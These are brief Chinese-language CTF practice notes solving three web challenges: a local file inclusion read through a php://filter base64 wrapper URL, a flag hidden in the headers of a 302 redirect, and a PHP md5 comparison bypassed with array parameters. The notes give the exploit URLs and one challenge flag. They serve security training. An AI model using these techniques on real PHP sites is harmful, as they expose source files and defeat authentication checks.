##CTF联系纪要##
##实验地址：https://cgctf.nuptsast.com/challenges#Web###
###实验资料：https://ctf-wiki.github.io/ctf-wiki

1.web
 .文件包含 属于php代码审计类
 题目：文件包含没错 这就是传说中的LFI
 源码分析：<html>
    <title>asdf</title>
    
<a href="./index.php?file=show.php">click me? no</a></html>
使用连接：http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/convert.base64-encode/resource=index.php  decode base64获得flag

.查看header 单身一百年也没用
源码分析：
<html>
    <head>
        <meta http-equiv="content-type" content="text/html;charset=utf-8">
    </head>
    <body>
        <a href="./index.php">_到这里找key__</a>
    </body>
</html>
使用工具fiddler  这是一个302重定向  查看header的 miscellaneous 得到flag
<h3>题目bypass again<h3>依然是php代码审计md5弱类型 使用md5md5() 中的需要是一个 string 类型的参数。但是当你传递一个 array 时，md5() 不会报错，只是会无法正确地求出 array 的 md5 值，这样就会导致任意 2 个 array 的 md5 值都会相等。
 <code>
  if (isset($_GET['a']) and isset($_GET['b'])) {
if ($_GET['a'] != $_GET['b'])
if (md5($_GET['a']) == md5($_GET['b']))
die('Flag: '.$flag);
else
print 'Wrong.';
}
Flag: nctf{php_is_so_cool}
 </code>
构造http://chinalover.sinaapp.com/web17/index.php?a[]=123&b[]=232  
